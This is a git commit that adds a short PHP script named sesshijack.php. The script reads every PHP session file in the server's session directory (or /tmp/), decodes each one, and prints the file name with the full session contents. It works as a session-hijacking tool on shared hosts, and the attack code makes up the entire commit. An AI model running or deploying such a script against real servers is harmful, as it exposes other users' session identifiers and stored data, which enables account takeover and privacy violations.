589d4974fcd0dc86e86b5b1677c73642c18b3fc5
Felipe Leñero <jf.lenero@gmail.com>
2015-12-17 15:19:35 -0800

    Create sesshijack.php

---
+++ sesshijack.php
@@ -0,0 +1,21 @@
+<?php
+
+$dir = session_save_path() ? session_save_path() : "/tmp/";
+//$dir = "/tmp/";
+
+// Session Mapping
+/*$sessions = array();
+foreach (glob($dir."sess_*") as $filename){
+    $sessions[] = str_replace($dir, "", $filename);
+}
+print_r($sessions,false);*/
+
+foreach (glob($dir."sess_*") as $filename){
+    $session = file_get_contents($filename);
+    $filename = str_replace($dir, "", $filename);
+    session_decode($session);
+    echo '<pre>';
+    echo $filename;
+    print_r($_SESSION);
+    echo '</pre>';
+}
